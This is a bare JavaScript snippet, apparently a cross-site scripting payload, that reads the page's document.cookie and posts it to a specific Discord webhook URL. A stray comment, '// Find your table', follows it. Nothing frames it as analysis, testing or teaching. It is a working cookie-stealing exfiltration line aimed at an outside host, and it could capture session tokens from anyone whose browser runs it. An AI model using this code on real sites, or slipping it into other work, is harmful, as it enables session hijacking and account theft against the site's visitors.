fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", { 
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ content: document.cookie })
});

// Find your table
